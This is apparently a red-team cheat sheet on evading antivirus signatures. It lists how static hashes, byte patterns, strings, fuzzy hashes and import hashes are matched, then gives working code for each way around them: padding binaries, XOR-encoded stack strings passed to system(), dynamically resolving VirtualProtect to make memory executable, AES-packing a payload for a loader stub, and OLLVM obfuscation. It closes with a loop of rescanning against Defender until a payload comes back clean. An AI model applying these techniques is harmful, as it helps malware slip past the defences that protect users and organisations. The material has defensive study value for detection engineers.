# Signature Bypass

## How AV Signatures Work

1. **Static hash**: SHA256 of known malware files → instant match
2. **Byte pattern**: scan for specific byte sequences at known offsets
3. **String matching**: grep for suspicious plaintext strings
4. **Fuzzy hash**: ssdeep/tlsh for structurally similar files
5. **Import hash**: hash of imported functions list

## Bypass Techniques

### 1. Binary Padding / Modification

```bash
# Append null bytes (changes hash, may not change detection)
dd if=/dev/zero bs=1 count=1000 >> payload.exe

# Modify non-critical bytes (PE overlay, timestamps, debug info)
# Strip debug info with strip or resource editor
```

### 2. String Obfuscation

```c
// Instead of: char* cmd = "cmd.exe /c whoami";
// Use: stack strings
void run_cmd() {
    char cmd[] = {
        'c'^0x1,'m'^0x1,'d'^0x1,'.'^0x1,'e'^0x1,'x'^0x1,'e'^0x1,
        ' '^0x1,'/'^0x1,'c'^0x1,' '^0x1,
        'w'^0x1,'h'^0x1,'o'^0x1,'a'^0x1,'m'^0x1,'i'^0x1, 0
    };
    for (int i = 0; cmd[i]; i++) cmd[i] ^= 0x1;
    system(cmd);
}
```

### 3. Import Table Obfuscation

```c
// Dynamic resolution instead of static imports
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

HMODULE k32 = GetModuleHandleA("kernel32.dll");
pVirtualProtect fnVP = (pVirtualProtect)GetProcAddress(k32, "VirtualProtect");
fnVP(addr, size, PAGE_EXECUTE_READWRITE, &old);
```

### 4. Packing / Encryption

```python
# AES-encrypt payload, decrypt stub at runtime
from Crypto.Cipher import AES
import os

key = os.urandom(16)
iv  = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv)

payload = open('payload.bin', 'rb').read()
# pad to block size
pad = 16 - len(payload) % 16
payload += bytes([pad] * pad)

encrypted = cipher.encrypt(payload)
# embed key+iv+ciphertext in loader stub
```

### 5. Compile-Time Obfuscation

```cmake
# LLVM passes: Obfuscator-LLVM (ollvm)
# Techniques: bogus control flow, instruction substitution, control flow flattening
clang -mllvm -fla -mllvm -bcf -mllvm -sub payload.c -o payload.exe
```

## Detection Testing Workflow

```bash
# Test against Windows Defender (offline, no telemetry)
# 1. Disconnect from internet
# 2. Run: MpCmdRun.exe -Scan -ScanType 3 -File payload.exe
# 3. Iterate until clean

# Check VirusTotal (only if OK with public submission)
# Use local AV scan for sensitive payloads
```
